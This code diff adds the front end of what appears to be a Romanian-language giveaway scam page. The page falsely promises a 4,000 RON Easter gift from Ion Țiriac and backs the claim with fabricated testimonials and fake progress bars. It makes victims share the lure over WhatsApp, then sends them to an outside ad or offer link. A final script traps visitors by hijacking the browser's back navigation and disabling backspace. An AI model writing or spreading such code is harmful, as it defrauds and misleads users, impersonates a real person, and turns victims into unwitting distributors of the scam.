@@ -1110,3 +1110,224 @@ var timeleft = 98542;
     background: #f9f9f9;
     border-radius: 10px;
     overflow: hidden;
+<style>
+        .testimonials-container {
+            width: 350px;
+            height: 450px;
+            background: #f9f9f9;
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .testimonials-wrapper {
+            position: absolute;
+            width: 100%;
+            animation: scroll-up 15s linear infinite;
+        }
+
+        .testimonial-card {
+            padding: 20px;
+            border-bottom: 1px solid #ddd;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .testimonial-card img {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .testimonial-content h4 {
+            margin: 0;
+            font-size: 16px;
+            color: #333;
+        }
+
+        .testimonial-content p {
+            margin: 5px 0 0;
+            font-size: 14px;
+            color: #666;
+        }
+
+        @keyframes scroll-up {
+            0% { top: 0; }
+            100% { top: -600px; } /* Adjust based on content height */
+        }
+    </style>
+
+    <div class="testimonials-container">
+        <div class="testimonials-wrapper">
+            <div class="testimonial-card">
+                <img src="https://i.pravatar.cc/100?u=1" alt="User">
+                <div class="testimonial-content">
+                    <h4>Andrei Popescu</h4>
+                    <p>Tocmai mi-am primit cei 4.000 RON! Mulțumesc mult!</p>
+                </div>
+            </div>
+            <div class="testimonial-card">
+                <img src="https://i.pravatar.cc/100?u=2" alt="User">
+                <div class="testimonial-content">
+                    <h4>Elena Popa</h4>
+                    <p>La început am fost sceptică, dar banii au intrat direct în contul meu BCR.</p>
+                </div>
+            </div>
+            <div class="testimonial-card">
+                <img src="https://i.pravatar.cc/100?u=3" alt="User">
+                <div class="testimonial-content">
+                    <h4>Vlad Ciobanu</h4>
+                    <p>Un ajutor excelent pentru Paște. Mulțumim, Ion Țiriac!</p>
+                </div>
+            </div>
+            <div class="testimonial-card">
+                <img src="https://i.pravatar.cc/100?u=4" alt="User">
+                <div class="testimonial-content">
+                    <h4>Maria Drăgan</h4>
+                    <p>A durat doar 15 minute să primesc confirmarea prin SMS.</p>
+                </div>
+            </div>
+            <div class="testimonial-card">
+                <img src="https://i.pravatar.cc/100?u=5" alt="User">
+                <div class="testimonial-content">
+                    <h4>Darius Matei</h4>
+                    <p>Foarte ușor de aplicat. Recomand tuturor prietenilor mei.</p>
+                </div>
+            </div>
+            <div class="testimonial-card">
+                <img src="https://i.pravatar.cc/100?u=1" alt="User">
+                <div class="testimonial-content">
+                    <h4>Andrei Popescu</h4>
+                    <p>Tocmai mi-am primit cei 4.000 RON! Mulțumesc mult!</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</center>
+
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+
+<script>
+    var text = "Ion Țiriac: Felicitări, ești eligibil pentru un cadou de Paște de 4.000 RON de la Ion Țiriac. Apasă OK pentru a activa acum.",
+        url = "https://goldenstash.online/Share.html",
+        m = "Ion Țiriac: Felicitări, ești eligibil pentru un cadou de Paște de 4.000 RON de la Ion Țiriac. Apasă OK pentru a activa acum.",
+        s = "https://goldenstash.online/Share.html",
+        abcde = "https://omg10.com/4/10826485",
+        cl = "https://omg10.com/4/10826485";
+
+    $("#go").click(function () {
+        $("#intro").fadeOut(0);
+        $("#loader").fadeIn(1000);
+        var i = 0;
+        var interval = setInterval(function () {
+            $("#num").text(i + "%");
+            i++;
+            if (i > 100) {
+                clearInterval(interval);
+                $("#loader").fadeOut(0);
+                $("#info").fadeIn(1000);
+            }
+        }, 50);
+    });
+
+    $("#confirm").click(function () {
+        if ($("#name").val().length < 4) {
+            $(".error").fadeIn(500);
+        } else {
+            $(".error").fadeOut(0);
+            $("#info").fadeOut(0);
+            $("#checking").fadeIn(1000);
+            var i = 0;
+            var interval = setInterval(function () {
+                i += Math.floor(Math.random() * 5) + 1;
+                $("#percentage").text(i + "%");
+                $("#fill").css("width", i + "%");
+                if (i == 50) {
+                    i = 49;
+                    setTimeout(function () {
+                        i = 50;
+                    }, 1000);
+                }
+                if (i >= 100) {
+                    clearInterval(interval);
+                    $("#load").fadeOut(0);
+                    $("#check").fadeIn(0);
+                    setTimeout(function () {
+                        $("#checking").fadeOut(0);
+                        $("#share").fadeIn(1000);
+                        $("#getname").html($("#name").val());
+                    }, 500);
+                }
+            }, 50);
+        }
+    });
+
+    $("#whatsapp").click(function () {
+        window.open('whatsapp://send?text=' + text);
+        var i = 0;
+        var interval = setInterval(function () {
+            i += 1;
+            $("#percentage2").text(i + "%");
+            $("#fill2").css("width", i + "%");
+            if (i >= 100) {
+                clearInterval(interval);
+                $("#share").fadeOut(0);
+                $("#claim").fadeIn(1000);
+            }
+        }, 50);
+    });
+
+    $("#offer").click(function () {
+        window.open(abcde, "_blank");
+    });
+</script>
+
+    <script>
+        (function (global) {
+
+	if(typeof (global) === "undefined")
+	{
+		throw new Error("window is undefined");
+	}
+
+    var _hash = "!";
+    var noBackPlease = function () {
+        global.location.href += "#";
+
+		// ne asigurăm că avem fructul disponibil pentru suc....
+		// 50 milisecunde pentru o singură dată nu costă mult (^__^)
+        global.setTimeout(function () {
+            global.location.href += "!";
+        }, 50);
+    };
+	
+	// Anterior am avut setInerval aici....
+    global.onhashchange = function () {
+        if (global.location.hash !== _hash) {
+            global.location.hash = _hash;
+        }
+    };
+
+    global.onload = function () {
+        
+		noBackPlease();
+
+		// dezactivează backspace pe pagină, cu excepția câmpurilor de input și textarea..
+		document.body.onkeydown = function (e) {
+            var elm = e.target.nodeName.toLowerCase();
+            if (e.which === 8 && (elm !== 'input' && elm  !== 'textarea')) {
+                e.preventDefault();
+            }
+            // oprește propagarea evenimentului în sus în arborele DOM..
+            e.stopPropagation();
+        };
+		
+    };
+
+})(window);
+    </script>
+</body>
+</html>
